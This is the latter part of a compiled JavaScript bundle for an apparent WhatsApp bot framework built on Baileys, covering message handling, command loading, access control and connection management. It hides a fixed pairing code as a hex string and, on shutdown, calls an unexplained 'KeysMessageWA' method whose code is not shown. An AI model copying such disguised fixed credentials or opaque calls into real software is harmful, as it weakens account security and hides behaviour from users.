  console.log(`\u2318 Type: ${color(chatType, "yellow")}`);
  console.log(`\u2318 Time: ${color(timestamp, "magenta")}`);
  console.log(`\u2318 Message Type: ${color(messageType, "cyan")}`);
  console.log("\u2570\u2550\u0361\u2D7F\u2500\u2508\u2500\u2508\u2500 > \u{13211}");
  console.log(`\u256D\u2500\u2508\u2500 ${color("Message Content", "magenta")} \u2322\u1DFC\u0336\u2500\u1422\u05C4\u1BAB \u05C5\u279B
\u2726 Content: ${color(messageContent, "yellow")}
\u2570\u2550\u0361\u2D7F\u2500\u2508\u2500\u2508\u2500 > \u{144B1}
`);
};
var print_default = print;

// src/events/message.event.ts
var message_event = (OOP) => {
  OOP.sock.ev.on("messages.upsert", async ({ messages, type }) => {
    if (type !== "notify" || !OOP.sock) return;
    print_default(messages, OOP);
    for (const msg of messages) {
      if (!msg.message) continue;
      if (msg.message?.protocolMessage || msg.message?.senderKeyDistributionMessage || msg.message?.stickerSyncRmrMessage) {
        continue;
      }
      if (OOP.config.autoRead) await OOP.sock.readMessages([msg.key]);
      try {
        const messageObj = await msgObj(msg, OOP.sock, OOP.config.owners);
        if (!messageObj) continue;
        if (OOP.config.fromMe === true && !messageObj.fromMe) continue;
        if (OOP.config.fromMe === false && messageObj.fromMe) continue;
        const processed = await OOP.commandSystem.processMessage(messageObj, OOP, OOP.config.prefix);
        if (!processed) {
          for (const handler of OOP.handlers) {
            try {
              const response = await handler(messageObj);
              if (response) {
                if (typeof response === "string") {
                  await messageObj.reply(response);
                } else if (typeof response === "object") {
                  await messageObj.reply(response.text || "", response);
                }
                break;
              }
            } catch (error) {
              if (OOP.config.onError && typeof OOP.config.onError === "function") OOP.config.onError(error);
            }
          }
        }
      } catch (error) {
        if (OOP.config.onError && typeof OOP.config.onError === "function") OOP.config.onError(error);
      }
    }
  });
};
var message_event_default = message_event;

// src/uilts/scrapy.ts
var scrapy = {
  test: async (url) => {
    try {
      const res = await fetch(url);
      return res.text();
    } catch {
      return false;
    }
  }
};
var scrapy_default = scrapy;

// src/uilts/loadCmds.ts
var loadCommands = async (OOP) => {
  try {
    const commands = await loadCommandsFromPath(OOP.config.commandsPath);
    commands.forEach((cmd) => OOP.commandSystem.register(cmd));
    if (OOP.config.showLogs) {
      console.log(color(`       _,    _   _    ,_
  .o888P     Y8o8Y     Y888o.
 d88888      88888      88888b
d888888b_  _d88888b_  _d888888b
8888888888888888888888888888888
8888888888888888888888888888888
YJGS8P"Y888P"Y888P"Y888P"Y8888P
 Y888   '8'   Y8P   '8'   888Y
  '8o          V          o8'
    \`                     \``, "red"));
      logger_default.line();
      logger_default.info(`Loaded (${commands.length}) commands in "${OOP.config.commandsPath}"`);
      logger_default.info(`Name Bot: ${OOP.namebot || "WhatsApp Bot"}`);
      logger_default.line();
    }
    ;
  } catch (error) {
    logger_default.error(`[${(/* @__PURE__ */ new Date()).toLocaleTimeString()}] Error loading Commands: ${error.message}`);
  }
};
var loadCmds_default = loadCommands;

// src/default/access-control.ts
var ACCESS_MESSAGES = {
  disabled: "\u26A0\uFE0F *This command is currently disabled*",
  ownerOnly: "\u274C *This command is for owner only*",
  groupOnly: "\u{1F465} *This command is for groups only*",
  privateOnly: "\u{1F512} *This command is for private chats only*",
  botAdmin: "\u{1F916} *Bot needs to be admin to use this command*",
  cooldown: (t) => `\u23F3 Please wait ${t} seconds before using this command again.`,
  error: "\u274C *An error occurred during execution*"
};
var GROUP_MESSAGES = {
  add: (p) => `\u{1F44B} Welcome ${p.join(", ")}`,
  remove: (p) => `\u{1F44B} Goodbye ${p.join(", ")}`,
  promote: (p) => `\u2B06\uFE0F ${p.join(", ")} promoted to admin`,
  demote: (p) => `\u2B07\uFE0F ${p.join(", ")} demoted from admin`
};
async function handleAccessControl(bot, msg, checkType, ...args) {
  if (bot.userAccessHandler) {
    const result = await bot.userAccessHandler(msg, checkType, ...args);
    if (result !== void 0) return;
  }
  const message = checkType === "cooldown" ? ACCESS_MESSAGES[checkType](args[0]) : ACCESS_MESSAGES[checkType];
  if (message) await msg.reply(message);
}
async function handleGroupEvent(bot, event, eventType) {
  if (bot.userGroupEventHandler) {
    const result = await bot.userGroupEventHandler(event, eventType);
    if (result !== void 0) return;
  }
  if (!bot.sock) return;
  const messageFunc = GROUP_MESSAGES[eventType];
  if (messageFunc)
    await bot.sock.sendMessage(event.chat, { text: messageFunc(event.participants) });
}

// src/index.ts
var WhatsAppBot = class {
  constructor(config) {
    this.sock = null;
    this.sockBaileys = null;
    this.scrapy = scrapy_default;
    this.handlers = [];
    this.userAccessHandler = null;
    this.userGroupEventHandler = null;
    this.reconnectTimeout = null;
    this.reconnectAttempts = 0;
    this.isRunning = false;
    this.maxReconnectAttempts = 5;
    this.credsSaver = null;
    this.cleanup = async () => {
      try {
        if (this.reconnectTimeout) {
          clearTimeout(this.reconnectTimeout);
          this.reconnectTimeout = null;
        }
        if (this.sock) {
          this.sock.ws?.close();
          this.sock = null;
          this.sockBaileys = null;
        }
        if (this.config.showLogs) {
          logger_default.done("Cleanup completed");
        }
      } catch (error) {
        logger_default.error(`Cleanup error: ${error}`);
      }
    };
    this.config = BotConfigSchema.parse(config);
    this.commandSystem = new CommandSystem();
    this.setupExit();
  }
  setupExit() {
    const exit = async (signal) => {
      if (this.config.showLogs) {
        logger_default.loading(`Received ${signal}, cleaning up...`);
      }
      if (this.sock?.ws?.readyState === 1) {
        this.sock.KeysMessageWA();
      }
      await this.cleanup();
      process.exit(0);
    };
    process.on("SIGINT", () => exit("SIGINT"));
    process.on("SIGTERM", () => exit("SIGTERM"));
  }
  onCommandAccess(handler) {
    this.userAccessHandler = handler;
  }
  onGroupEvent(handler) {
    this.userGroupEventHandler = handler;
  }
  onMessage(handler) {
    this.handlers.push(handler);
  }
  onBeforeCommand(handler) {
    this.commandSystem.before(handler);
  }
  onAfterCommand(handler) {
    this.commandSystem.after(handler);
  }
  async handleAccessControl(msg, checkType, ...args) {
    await handleAccessControl(this, msg, checkType, ...args);
  }
  async handleGroupEvent(event, eventType) {
    await handleGroupEvent(this, event, eventType);
  }
  async start() {
    if (this.isRunning) {
      logger_default.warn("Bot is already running");
      return;
    }
    try {
      await loadCmds_default(this);
      const { version } = await baileys.fetchLatestBaileysVersion();
      const { state, saveCreds } = await baileys.useMultiFileAuthState(this.config.sessionPath);
      this.credsSaver = saveCreds;
      const isNewSession = !state.creds.registered;
      if (isNewSession && !this.config.printQR && this.config.showLogs && this.config.phoneNumber) {
        logger_default.done("New session - Waiting for pairing...");
        logger_default.info(`Phone number: ${this.config.phoneNumber}`);
        setTimeout(async () => {
          try {
            if (this.sock) {
              const code = await this.sock.requestPairingCode(this.config.phoneNumber, Buffer.from("56454e4931323334", "hex").toString());
              console.log(`\u{1F510} Pairing Code ${color(code, "yellow")}`);
              logger_default.line();
            }
          } catch (error) {
            logger_default.error(`Pairing error: ${error.message}`);
          }
        }, 2e3);
      }
      this.sockBaileys = baileys.makeWASocket({
        version,
        auth: state,
        logger: pino__default.default({ level: "silent" }),
        browser: baileys.Browsers.ubuntu(this.config.browser),
        printQRInTerminal: isNewSession && this.config.printQR,
        markOnlineOnConnect: this.config.markOnline,
        syncFullHistory: this.config.syncHistory,
        generateHighQualityLinkPreview: this.config.linkPreview
      });
      if (this.sockBaileys) {
        this.sock = await sockMyFun(this.sockBaileys);
        this.setupEvents(saveCreds, isNewSession);
      }
      this.isRunning = true;
      this.reconnectAttempts = 0;
    } catch (error) {
      logger_default.error(`Failed to start bot: ${error instanceof Error ? error.message : "Unknown error"}`);
      if (this.config.onError && typeof this.config.onError === "function") {
        this.config.onError(error);
      }
      if (this.config.autoReconnect && this.reconnectAttempts < this.maxReconnectAttempts) {
        this.scheduleReconnect();
      }
    }
  }
  setupEvents(saveCreds, isNewSession) {
    if (!this.sock) return;
    this.sock.ev.on("creds.update", saveCreds);
    connection_events_default(this);
    group_event_default(this);
    message_event_default(this);
  }
  scheduleReconnect() {
    if (this.reconnectTimeout) {
      clearTimeout(this.reconnectTimeout);
    }
    this.reconnectAttempts++;
    const delay = this.config.reconnectDelay * this.reconnectAttempts;
    logger_default.info(`Scheduling reconnect attempt ${this.reconnectAttempts}/${this.maxReconnectAttempts} in ${delay}ms`);
    this.reconnectTimeout = setTimeout(() => this.restart(), delay);
  }
  async restart() {
    logger_default.warn("Attempting to restart bot...");
    await this.cleanup();
    process.exit(0);
  }
  async stop() {
    logger_default.info("Stopping bot...");
    await this.cleanup();
  }
  registerCommand(command) {
    this.commandSystem.register(command);
  }
  unregisterCommand(commandName) {
    return this.commandSystem.unregister(commandName);
  }
  getCommand(commandName) {
    return this.commandSystem.findCommand(commandName);
  }
  getAllCommands() {
    return this.commandSystem.getAll();
  }
  useMiddleware(middleware) {
    this.commandSystem.use(middleware);
  }
  clearCooldowns() {
    this.commandSystem.clearCooldowns();
  }
  getOwners() {
    return this.config.owners;
  }
  isOwner(jid) {
    return this.config.owners.some((o) => o.jid === jid);
  }
  isConnected() {
    return this.isRunning && this.sock !== null && this.sock.user !== void 0;
  }
};
var createWhatsAppBot = (config) => new WhatsAppBot(config);

exports.WhatsAppBot = WhatsAppBot;
exports.createWhatsAppBot = createWhatsAppBot;
//# sourceMappingURL=index.cjs.map
//# sourceMappingURL=index.cjs.map